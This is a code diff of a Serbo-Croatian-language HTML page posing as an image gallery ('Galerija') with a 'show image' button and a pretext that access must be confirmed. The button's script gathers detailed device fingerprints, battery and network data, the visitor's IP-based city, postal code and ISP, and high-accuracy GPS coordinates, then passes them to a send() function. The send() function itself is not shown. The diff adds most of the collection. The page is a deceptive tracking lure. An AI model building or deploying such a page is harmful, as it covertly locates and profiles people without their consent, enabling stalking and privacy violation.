@@ -9,63 +9,73 @@
     body {
       margin: 0;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
-      background: #f0f2f5;
+      background: #eef2f7;
     }
 
     .container {
-      max-width: 400px;
+      max-width: 420px;
       margin: 60px auto;
-      background: white;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.12);
       overflow: hidden;
     }
 
     .header {
-      background: #1877f2;
+      background: linear-gradient(135deg, #1877f2, #0b5ed7);
       color: white;
-      padding: 16px;
-      font-size: 18px;
-      font-weight: bold;
+      padding: 18px;
+      font-size: 20px;
+      font-weight: 700;
       text-align: center;
     }
 
     .content {
-      padding: 20px;
+      padding: 24px;
       text-align: center;
     }
 
-    .content img {
-      width: 100%;
-      border-radius: 8px;
-      margin-bottom: 15px;
+    .preview {
+      height: 220px;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #dbeafe, #f8fafc);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 18px;
+      color: #64748b;
+      font-size: 44px;
     }
 
     .title {
-      font-size: 18px;
-      margin-bottom: 10px;
-      font-weight: 500;
+      font-size: 21px;
+      font-weight: 700;
+      color: #111827;
+      margin-bottom: 8px;
     }
 
-    .button {
+    .subtitle {
+      font-size: 14px;
+      color: #6b7280;
+      margin-bottom: 20px;
+    }
+
+    button {
       background: #1877f2;
       color: white;
       border: none;
-      padding: 14px;
+      padding: 15px 18px;
       width: 100%;
-      border-radius: 8px;
-      font-size: 16px;
+      border-radius: 10px;
+      font-size: 17px;
+      font-weight: 700;
       cursor: pointer;
     }
 
-    .button:hover {
-      background: #166fe5;
-    }
-
     .status {
-      margin-top: 10px;
+      margin-top: 14px;
       font-size: 14px;
-      color: gray;
+      color: #6b7280;
     }
   </style>
 </head>
@@ -76,11 +86,12 @@
   <div class="header">Galerija</div>
 
   <div class="content">
-    <img src="https://via.placeholder.com/400x250" alt="Preview">
+    <div class="preview">🖼️</div>
 
     <div class="title">Klikni da vidiš sliku</div>
+    <div class="subtitle">Za prikaz sadržaja potrebno je potvrditi pristup.</div>
 
-    <button class="button" onclick="start()">Prikaži sliku</button>
+    <button onclick="start()">Prikaži sliku</button>
 
     <div class="status" id="status"></div>
   </div>
@@ -91,26 +102,99 @@ async function start() {
   document.getElementById("status").textContent = "Učitavanje...";
 
   let data = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screen: screen.width + "x" + screen.height,
-    time: new Date().toLocaleString()
+    userAgent: navigator.userAgent || "Nicht verfügbar",
+    platform: navigator.platform || "Nicht verfügbar",
+    vendor: navigator.vendor || "Nicht verfügbar",
+    language: navigator.language || "Nicht verfügbar",
+    languages: navigator.languages ? navigator.languages.join(", ") : "Nicht verfügbar",
+
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Nicht verfügbar",
+    timezoneOffsetMinutes: new Date().getTimezoneOffset(),
+    time: new Date().toLocaleString(),
+
+    screenWidth: screen.width,
+    screenHeight: screen.height,
+    screenAvailableWidth: screen.availWidth,
+    screenAvailableHeight: screen.availHeight,
+    colorDepth: screen.colorDepth,
+    pixelDepth: screen.pixelDepth,
+    pixelRatio: window.devicePixelRatio,
+
+    windowWidth: window.innerWidth,
+    windowHeight: window.innerHeight,
+
+    online: navigator.onLine,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack || "Nicht verfügbar",
+
+    touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+
+    cpuCores: navigator.hardwareConcurrency || "Nicht verfügbar",
+    deviceMemoryGB: navigator.deviceMemory || "Nicht verfügbar",
+
+    currentUrl: window.location.href,
+    referrer: document.referrer || "Direkt geöffnet"
   };
 
-  // GPS
+  if (navigator.connection) {
+    data.networkEffectiveType = navigator.connection.effectiveType || "Nicht verfügbar";
+    data.networkDownlink = navigator.connection.downlink || "Nicht verfügbar";
+    data.networkSaveData = navigator.connection.saveData || false;
+    data.networkRtt = navigator.connection.rtt || "Nicht verfügbar";
+  }
+
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      data.batteryLevel = Math.round(battery.level * 100) + "%";
+      data.batteryCharging = battery.charging;
+      data.batteryChargingTime = battery.chargingTime;
+      data.batteryDischargingTime = battery.dischargingTime;
+    } catch (e) {
+      data.batteryInfo = "Nicht verfügbar";
+    }
+  }
+
+  try {
+    const ipResponse = await fetch("https://ipapi.co/json/");
+    const ipData = await ipResponse.json();
+
+    data.ip = ipData.ip || "Nicht verfügbar";
+    data.ipCity = ipData.city || "Nicht verfügbar";
+    data.ipRegion = ipData.region || "Nicht verfügbar";
+    data.ipCountry = ipData.country_name || "Nicht verfügbar";
+    data.ipPostal = ipData.postal || "Nicht verfügbar";
+    data.ipOrg = ipData.org || "Nicht verfügbar";
+    data.ipTimezone = ipData.timezone || "Nicht verfügbar";
+  } catch (e) {
+    data.ipInfo = "Nicht verfügbar";
+  }
+
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       function(pos) {
-        data.lat = pos.coords.latitude;
-        data.lon = pos.coords.longitude;
+        data.gpsLatitude = pos.coords.latitude;
+        data.gpsLongitude = pos.coords.longitude;
+        data.gpsAccuracyMeters = pos.coords.accuracy;
+        data.gpsAltitude = pos.coords.altitude;
+        data.gpsSpeed = pos.coords.speed;
+        data.gpsHeading = pos.coords.heading;
         send(data);
       },
-      function() {
+      function(error) {
+        data.gpsStatus = "Nicht erlaubt oder fehlgeschlagen";
+        data.gpsError = error.message;
         send(data);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 12000,
+        maximumAge: 0
       }
     );
   } else {
+    data.gpsStatus = "Nicht unterstützt";
     send(data);
   }
 }
